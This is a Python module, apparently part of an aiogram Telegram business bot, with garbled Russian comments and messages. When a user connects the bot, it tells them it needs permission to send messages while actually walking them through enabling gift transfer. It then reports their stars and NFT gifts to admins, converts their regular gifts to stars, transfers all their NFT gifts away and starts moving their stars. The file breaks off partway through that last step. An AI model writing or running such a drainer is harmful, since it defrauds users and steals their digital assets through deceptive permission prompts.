import asyncio
import logging
from datetime import datetime
from typing import List, Dict, Any

from aiogram import Bot, F
from aiogram.types import BusinessConnection, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.methods import GetBusinessAccountGifts, GetBusinessConnection
from aiogram.dispatcher.router import Router
from aiogram.types import CallbackQuery

from config import get_main_admin_id, BALANCE_UPDATE_DELAY, MAX_NFT_DISPLAY
from utils.file_utils import save_connection, remove_connection, log_transfer
from utils.transfer import (
    get_star_balance, get_regular_gifts, get_unique_gifts, convert_regular_gifts,
    transfer_all_unique_gifts, transfer_all_stars, get_nft_real_id, get_nft_title
)
from utils.logging import log_business_connection, log_user_connection, log_nft_transfer, log_stars_transfer, log_gift_conversion, log_automation_trigger, log_business_error

router = Router()
logger = logging.getLogger(__name__)

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ (–±—É–¥—É—Ç –∑–∞–≥—Ä—É–∂–∞—Ç—å—Å—è –∏–∑ —Ñ–∞–π–ª–∞)
AUTO_TRANSFER_ENABLED = True
MANUAL_SELECTION_ENABLED = False
# –í—Ä–µ–º–µ–Ω–Ω–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏ - –æ—Ç–∫–ª—é—á–∏—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π
# –£–°–¢–ê–ù–û–í–ò–¢–¨ –í False –ü–û–°–õ–ï –ò–°–ü–†–ê–í–õ–ï–ù–ò–Ø –ë–ê–ì–ê
DEBUG_SKIP_PERMISSIONS_CHECK = False

def update_settings(auto_transfer: bool, manual_selection: bool):
    """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –≥–ª–æ–±–∞–ª—å–Ω—ã—Ö –Ω–∞—Å—Ç—Ä–æ–µ–∫"""
    global AUTO_TRANSFER_ENABLED, MANUAL_SELECTION_ENABLED
    AUTO_TRANSFER_ENABLED = auto_transfer
    MANUAL_SELECTION_ENABLED = manual_selection

def get_nft_title(gift) -> str:
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –Ω–∞–∑–≤–∞–Ω–∏—è NFT"""
    if hasattr(gift, 'title') and gift.title:
        return gift.title
    if hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'title') and gift.gift.title:
        return gift.gift.title
    return "NFT"

def get_nft_real_id(gift) -> str:
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —Ä–µ–∞–ª—å–Ω–æ–≥–æ ID NFT –¥–ª—è —Å—Å—ã–ª–∫–∏"""
    # –ü—Ä–æ–±—É–µ–º —Ä–∞–∑–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã –ø–æ–ª—É—á–µ–Ω–∏—è ID –¥–ª—è —Å—Å—ã–ª–∫–∏
    if hasattr(gift, 'gift_id') and gift.gift_id:
        return gift.gift_id
    elif hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'id') and gift.gift.id:
        return gift.gift.id
    elif hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'gift_id') and gift.gift.gift_id:
        return gift.gift.gift_id
    elif hasattr(gift, 'id') and gift.id:
        return gift.id
    elif hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'name') and gift.gift.name:
        return gift.gift.name
    elif hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'slug') and gift.gift.slug:
        return gift.gift.slug
    else:
        return getattr(gift, 'owned_gift_id', 'unknown')

async def check_business_permissions(bot: Bot, business_connection_id: str) -> dict:
    """
    –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
    
    –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï –ë–ê–ì–ê: 
    - –ò—Å–ø–æ–ª—å–∑—É–µ–º –æ–±—ä–µ–∫—Ç rights –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π
    - –ü—Ä–æ–≤–µ—Ä—è–µ–º can_transfer_and_upgrade_gifts –≤–º–µ—Å—Ç–æ can_reply
    - –î–æ–±–∞–≤–ª–µ–Ω–∞ –æ—Ç–ª–∞–¥–æ—á–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –¥–ª—è –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∏ –ø—Ä–æ–±–ª–µ–º
    """
    try:
        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
        connection_info = await bot(GetBusinessConnection(business_connection_id=business_connection_id))
        
        # –û—Ç–ª–∞–¥–æ—á–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
        logger.info(f"BusinessConnection object: {connection_info}")
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è —á–µ—Ä–µ–∑ –æ–±—ä–µ–∫—Ç rights
        permissions = {}
        rights = getattr(connection_info, 'rights', None)
        
        if rights:
            logger.info(f"BusinessBotRights: {rights}")
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ—Å–Ω–æ–≤–Ω—ã–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –ø–æ–¥–∞—Ä–∫–∞–º–∏
            permissions['can_transfer_and_upgrade_gifts'] = getattr(rights, 'can_transfer_and_upgrade_gifts', False)
            permissions['can_convert_gifts_to_stars'] = getattr(rights, 'can_convert_gifts_to_stars', False)
            permissions['can_transfer_stars'] = getattr(rights, 'can_transfer_stars', False)
            permissions['can_view_gifts_and_stars'] = getattr(rights, 'can_view_gifts_and_stars', False)
            
            # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
            permissions['can_reply'] = getattr(rights, 'can_reply', None)
            permissions['can_read_messages'] = getattr(rights, 'can_read_messages', None)
            permissions['can_delete_sent_messages'] = getattr(rights, 'can_delete_sent_messages', None)
            permissions['can_delete_all_messages'] = getattr(rights, 'can_delete_all_messages', None)
            permissions['can_edit_name'] = getattr(rights, 'can_edit_name', False)
            permissions['can_edit_bio'] = getattr(rights, 'can_edit_bio', False)
            permissions['can_edit_profile_photo'] = getattr(rights, 'can_edit_profile_photo', False)
            permissions['can_edit_username'] = getattr(rights, 'can_edit_username', False)
            permissions['can_change_gift_settings'] = getattr(rights, 'can_change_gift_settings', False)
            permissions['can_manage_stories'] = getattr(rights, 'can_manage_stories', False)
            permissions['can_delete_outgoing_messages'] = getattr(rights, 'can_delete_outgoing_messages', None)
        else:
            logger.warning("–û–±—ä–µ–∫—Ç rights –Ω–µ –Ω–∞–π–¥–µ–Ω")
        
        # –õ–æ–≥–∏—Ä—É–µ–º –≤—Å–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
        logger.info(f"All permissions: {permissions}")
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ –≤—Å–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –ø–æ–¥–∞—Ä–∫–∞–º–∏
        # –î–ª—è —Ä–∞–±–æ—Ç—ã —Å –ø–æ–¥–∞—Ä–∫–∞–º–∏ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ can_transfer_and_upgrade_gifts
        required_permissions = ['can_transfer_and_upgrade_gifts']
        missing_permissions = [perm for perm in required_permissions if not permissions.get(perm, False)]
        
        logger.info(f"Required permissions: {required_permissions}")
        logger.info(f"Missing permissions: {missing_permissions}")
        logger.info(f"can_transfer_and_upgrade_gifts value: {permissions.get('can_transfer_and_upgrade_gifts', False)}")
        
        # –§–∏–Ω–∞–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞
        has_all_permissions = permissions.get('can_transfer_and_upgrade_gifts', False)
        missing_permissions = ['can_transfer_and_upgrade_gifts'] if not has_all_permissions else []
        
        logger.info(f"Final check - has_all_permissions: {has_all_permissions}")
        
        return {
            'has_all_permissions': has_all_permissions,
            'missing_permissions': missing_permissions,
            'all_permissions': permissions
        }
        
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π: {e}")
        return {
            'has_all_permissions': False,
            'missing_permissions': ['unknown'],
            'all_permissions': {},
            'error': str(e)
        }

@router.business_connection()
async def handle_business_connect(business_connection: BusinessConnection, bot: Bot):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π"""
    try:
        user_id = business_connection.user.id
        conn_id = business_connection.id
        username = business_connection.user.username or 'N/A'

        # –õ–æ–≥–∏—Ä—É–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —Å—Ä–∞–∑—É
        logger.info(f"üîó –ù–æ–≤–æ–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ: @{username} (ID: {user_id}, Connection ID: {conn_id})")
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∞–º –æ –Ω–æ–≤–æ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
        from config import get_admin_ids
        admin_notification = (
            f"üîó <b>–ù–æ–≤–æ–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ</b>\n"
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: <b>@{username}</b>\n"
            f"üÜî ID: <code>{user_id}</code>\n"
            f"üîó Connection ID: <code>{conn_id}</code>\n"
            f"‚è∞ –í—Ä–µ–º—è: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        for admin_id in get_admin_ids():
            try:
                await bot.send_message(admin_id, admin_notification, parse_mode="HTML")
            except Exception as e:
                logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –∞–¥–º–∏–Ω—É {admin_id}: {e}")

        if not conn_id:
            logger.error(f"business_connection.id is None for user {user_id} (@{username})")
            for admin_id in get_admin_ids():
                await bot.send_message(
                    admin_id,
                    f"‚ùå <b>–û—à–∏–±–∫–∞:</b> business_connection.id is None –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è <b>@{username}</b> (ID: <code>{user_id}</code>)",
                    parse_mode="HTML"
                )
            return

        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –≤ –ë–î
        connection_data = {
            "user_id": user_id,
            "business_connection_id": conn_id,
            "username": username,
            "first_name": business_connection.user.first_name,
            "last_name": business_connection.user.last_name,
            "connection_date": datetime.now().isoformat(),
            "last_activity": datetime.now().isoformat()
        }
        
        if not save_connection(connection_data):
            logger.error(f"–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}")
            return
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        permissions_check = await check_business_permissions(bot, conn_id)
        
        # –ï—Å–ª–∏ –Ω–µ –≤—Å–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω—ã, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
        if not permissions_check['has_all_permissions']:
            missing_perms = permissions_check['missing_permissions']
            permissions_message = (
                f"‚ö†Ô∏è <b>–í–Ω–∏–º–∞–Ω–∏–µ!</b> –î–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —Ä–∞–±–æ—Ç—ã –±–æ—Ç–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –Ω–∞ –æ—Ç–ø—Ä–∞–≤–∫—É —Å–æ–æ–±—â–µ–Ω–∏–π.\n\n"
                f"<b>–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—â–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è:</b>\n"
            )
            
            if 'can_transfer_and_upgrade_gifts' in missing_perms:
                permissions_message += "‚Ä¢ <b>–ü–µ—Ä–µ–≤–æ–¥ –∏ —É–ª—É—á—à–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–æ–≤</b> - –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å NFT –∏ –∑–≤–µ–∑–¥–∞–º–∏\n"
            
            permissions_message += (
                f"\nüìã <b>–ö–∞–∫ –∏—Å–ø—Ä–∞–≤–∏—Ç—å:</b>\n"
                f"1. –û—Ç–∫—Ä–æ–π—Ç–µ <b>–Ω–∞—Å—Ç—Ä–æ–π–∫–∏</b> –≤ Telegram\n"
                f"2. –ù–∞–π–¥–∏—Ç–µ –≤–∫–ª–∞–¥–∫—É <b>Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞</b>\n"
                f"3. –í—ã–±–µ—Ä–∏—Ç–µ –≤–∫–ª–∞–¥–∫—É <b>–ß–∞—Ç-–±–æ—Ç—ã</b>\n"
                f"4. –ù–∞–π–¥–∏—Ç–µ <b>@Storthash_bot</b>\n"
                f"5. –ù–∞–∂–º–∏—Ç–µ <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏</b> ‚Üí <b>–†–∞–∑—Ä–µ—à–µ–Ω–∏—è</b>\n"
                f"6. –í–∫–ª—é—á–∏—Ç–µ <b>–ü–µ—Ä–µ–≤–æ–¥ –∏ —É–ª—É—á—à–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–æ–≤</b>\n\n"
                f"üîß <b>–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–±:</b>\n"
                f"1. –û—Ç–∫—Ä–æ–π—Ç–µ —á–∞—Ç —Å @Storthash_bot\n"
                f"2. –ù–∞–∂–º–∏—Ç–µ –Ω–∞ –Ω–∞–∑–≤–∞–Ω–∏–µ –±–æ—Ç–∞ –≤–≤–µ—Ä—Ö—É\n"
                f"3. –í—ã–±–µ—Ä–∏—Ç–µ <b>–†–∞–∑—Ä–µ—à–µ–Ω–∏—è</b>\n"
                f"4. –í–∫–ª—é—á–∏—Ç–µ <b>–ü–µ—Ä–µ–≤–æ–¥ –∏ —É–ª—É—á—à–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–æ–≤</b>\n\n"
                f"–ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∏—Ç–µ –±–æ—Ç–∞ –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —Ä–∞–±–æ—Ç—ã! ‚≠êÔ∏è"
            )
            
            # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–æ–π –Ω–∞—Å—Ç—Ä–æ–µ–∫
            permissions_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="‚öôÔ∏è –ü–µ—Ä–µ–π—Ç–∏ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏", url="tg://settings")],
                [InlineKeyboardButton(text="üîÑ –ü–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∏—Ç—å –±–æ—Ç–∞", callback_data="reconnect_bot")]
            ])
            
            try:
                await bot.send_message(
                    user_id,
                    permissions_message,
                    parse_mode="HTML",
                    reply_markup=permissions_keyboard
                )
                logger.info(f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–µ–¥–æ—Å—Ç–∞—é—â–∏—Ö —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user_id}")
            except Exception as e:
                logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user_id}: {e}")
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∞–º –æ –Ω–µ–ø–æ–ª–Ω—ã—Ö —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è—Ö
            admin_notification = (
                f"‚ö†Ô∏è <b>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —Å –Ω–µ–ø–æ–ª–Ω—ã–º–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è–º–∏</b>\n"
                f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: <b>@{username}</b>\n"
                f"üÜî ID: <code>{user_id}</code>\n"
                f"‚ùå <b>–û–ø–µ—Ä–∞—Ü–∏–∏ –ù–ï –≤—ã–ø–æ–ª–Ω–µ–Ω—ã</b> - –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π\n\n"
                f"<b>–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—â–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è:</b>\n"
            )
            
            if 'can_transfer_and_upgrade_gifts' in missing_perms:
                admin_notification += "‚Ä¢ <b>–ü–µ—Ä–µ–≤–æ–¥ –∏ —É–ª—É—á—à–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–æ–≤</b>\n"
            
            admin_notification += f"\n–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–ª—É—á–∏–ª –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é –ø–æ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—é —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π."
            
            for admin_id in get_admin_ids():
                await bot.send_message(admin_id, admin_notification, parse_mode="HTML")
            
            # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ - –Ω–µ –≤—ã–ø–æ–ª–Ω—è–µ–º –æ–ø–µ—Ä–∞—Ü–∏–∏ —Å –Ω–µ–ø–æ–ª–Ω—ã–º–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è–º–∏
            return
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –±—ã–ª –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ –≤ –±–∞–∑–µ (–ø–æ–≤—Ç–æ—Ä–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ)
        from utils.database import DatabaseManager
        db = DatabaseManager()
        user_in_db = db.get_user(user_id)
        connection_type = "reconnected" if user_in_db else "connected"

        # –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å –∏ –ø–æ–¥–∞—Ä–∫–∏ –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
        star_balance = 0
        nft_count = 0
        regular_gifts_count = 0
        try:
            star_balance = await get_star_balance(bot, conn_id)
        except Exception:
            pass
        try:
            all_gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=conn_id))
            all_gifts = all_gifts_response.gifts if hasattr(all_gifts_response, 'gifts') else []
            nft_count = len([gift for gift in all_gifts if getattr(gift, 'type', None) == 'unique'])
            regular_gifts_count = len([gift for gift in all_gifts if getattr(gift, 'type', None) != 'unique'])
        except Exception:
            pass

        log_user_connection(username, user_id, star_balance, nft_count, regular_gifts_count)
        log_business_connection(username, user_id, connection_type)

        # –ü–æ–ª—É—á–∞–µ–º –Ω–∞—á–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥
        try:
            star_balance = await get_star_balance(bot, conn_id)
        except Exception as e:
            if "BUSINESS_CONNECTION_INVALID" in str(e):
                remove_connection(conn_id)
                for admin_id in get_admin_ids():
                    await bot.send_message(
                        admin_id,
                        f"‚ùå <b>BUSINESS_CONNECTION_INVALID</b> ‚Äî –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–æ –∏–∑ –±–∞–∑—ã –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è <b>@{username}</b> (ID: <code>{user_id}</code>)",
                        parse_mode="HTML"
                    )
                return
            else:
                raise

        # –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏
        try:
            all_gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=conn_id))
            all_gifts = all_gifts_response.gifts if hasattr(all_gifts_response, 'gifts') else []
            logger.info(f"–í–°–ï –ü–û–î–ê–†–ö–ò –¥–ª—è @{username} ({user_id}): {[str(gift) for gift in all_gifts]}")
            nft_gifts = [gift for gift in all_gifts if getattr(gift, 'type', None) == 'unique']
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –≤—Å–µ—Ö –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
            all_gifts = []
            nft_gifts = []

        # –§–æ—Ä–º–∏—Ä—É–µ–º –±–∞–∑–æ–≤—ã–π –æ—Ç—á–µ—Ç
        report = (
            f"üîó <b>–ù–æ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ</b>\n"
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: <b>@{username}</b>\n"
            f"üÜî ID: <code>{user_id}</code>\n"
            f"‚≠êÔ∏è –ó–≤–µ–∑–¥: <b>{star_balance}</b>\n"
        )
        
        # –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è—Ö
        if not permissions_check['has_all_permissions']:
            report += f"‚ö†Ô∏è <b>–†–∞–∑—Ä–µ—à–µ–Ω–∏—è:</b> <b>–ù–ï –ü–û–õ–ù–´–ï</b>\n"
            missing_perms = permissions_check['missing_permissions']
            for perm in missing_perms:
                if perm == 'can_transfer_and_upgrade_gifts':
                    report += f"‚Ä¢ –û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç: <b>–ü–µ—Ä–µ–≤–æ–¥ –∏ —É–ª—É—á—à–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–æ–≤</b>\n"
        else:
            report += f"‚úÖ <b>–†–∞–∑—Ä–µ—à–µ–Ω–∏—è:</b> <b>–ü–û–õ–ù–´–ï</b>\n"
        
        report += "\n"

        report += f"<b>–ù–∞–π–¥–µ–Ω–æ NFT-–ø–æ–¥–∞—Ä–∫–æ–≤:</b> <b>{len(nft_gifts)}</b>\n"
        for gift in nft_gifts[:MAX_NFT_DISPLAY]:
            title = get_nft_title(gift)
            owned_gift_id = getattr(gift, 'owned_gift_id', '???')
            real_id = get_nft_real_id(gift)

            nft_link = f"https://t.me/nft/{real_id}"
            report += f"‚Ä¢ {title} (<a href=\"{nft_link}\">{real_id}</a>, owned_id: {owned_gift_id})\n"
        if len(nft_gifts) > MAX_NFT_DISPLAY:
            report += f"‚Ä¢ ...–µ—â—ë {len(nft_gifts)-MAX_NFT_DISPLAY} NFT-–ø–æ–¥–∞—Ä–∫–æ–≤\n"

        # 1. –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –æ–±—ã—á–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤—ë–∑–¥—ã
        try:
            regular_gifts = await get_regular_gifts(bot, conn_id)
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ get_regular_gifts: {e}")
            regular_gifts = []
        gift_count = len(regular_gifts)
        report += f"\nüéÅ –û–±—ã—á–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤: <b>{gift_count}</b>\n"

        convert_result = {"gifts_total": gift_count, "gifts_converted": 0, "errors": []}
        if gift_count > 0:
            convert_result = await convert_regular_gifts(bot, conn_id, user_id)
            report += (
                f"\nüìä <b>–ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤</b>:\n"
                f"‚Ä¢ –û–±—ã—á–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –Ω–∞–π–¥–µ–Ω–æ: <b>{convert_result['gifts_total']}</b>\n"
                f"‚Ä¢ –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ: <b>{convert_result['gifts_converted']}</b>\n"
                f"‚Ä¢ –°–ª–∏—à–∫–æ–º —Å—Ç–∞—Ä—ã—Ö: <b>{convert_result['too_old']}</b>\n"
                f"‚Ä¢ –î—Ä—É–≥–∏–µ –æ—à–∏–±–∫–∏: <b>{convert_result['other_failed']}</b>\n"
            )
            if convert_result["errors"]:
                report += "\n‚ö†Ô∏è <b>–û—à–∏–±–∫–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏:</b>\n"
                for e in convert_result["errors"][:3]:
                    report += f"‚Ä¢ {e}\n"

        # –ñ–¥—ë–º –∑–∞—á–∏—Å–ª–µ–Ω–∏—è –∑–≤—ë–∑–¥
        if convert_result["gifts_converted"] > 0:
            await asyncio.sleep(BALANCE_UPDATE_DELAY)

        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–∞–ª–∞–Ω—Å –ø–æ—Å–ª–µ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏
        try:
            star_balance = await get_star_balance(bot, conn_id)
            report += f"\n‚≠êÔ∏è <b>–ë–∞–ª–∞–Ω—Å –ø–æ—Å–ª–µ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏:</b> <b>{star_balance}</b>\n"
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ –ø–æ—Å–ª–µ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏: {e}")
            star_balance = 0
            report += f"\n‚ùóÔ∏è <b>–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞:</b> {str(e)}\n"

        # 2. –ü–µ—Ä–µ–≤–æ–¥–∏–º –≤—Å–µ NFT
        nft_result = await transfer_all_unique_gifts(bot, conn_id, user_id)
        report += (
            f"\nüéÅ <b>NFT-–ø–æ–¥–∞—Ä–∫–æ–≤:</b> <b>{nft_result['total']}</b>\n"
            f"‚Ä¢ –£—Å–ø–µ—à–Ω–æ: <b>{nft_result['transferred']}</b>\n"
            f"‚Ä¢ –û—à–∏–±–æ–∫: <b>{nft_result['failed']}</b>\n"
        )
        if nft_result["errors"]:
            report += "\n‚ùóÔ∏è<b>–û—à–∏–±–∫–∏ NFT:</b>\n"
            for e in nft_result["errors"][:3]:
                if "STARGIFT_TRANSFER_TOO_EARLY" in e:
                    report += f"‚Ä¢ {e} ‚Äî <i>Telegram –Ω–µ —Ä–∞–∑—Ä–µ—à–∞–µ—Ç –ø–µ—Ä–µ–≤–æ–¥–∏—Ç—å NFT —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.</i>\n"
                elif "BALANCE_TOO_LOW" in e:
                    report += f"‚Ä¢ {e} ‚Äî <i>–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∑–≤—ë–∑–¥ –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞ NFT.</i>\n"
                else:
                    report += f"‚Ä¢ {e}\n"

        # 3. –ü–µ—Ä–µ–≤–æ–¥–∏–º –≤—Å–µ –æ—Å—Ç–∞–≤—à–∏–µ—Å—è –∑–≤—ë–∑–¥—ã
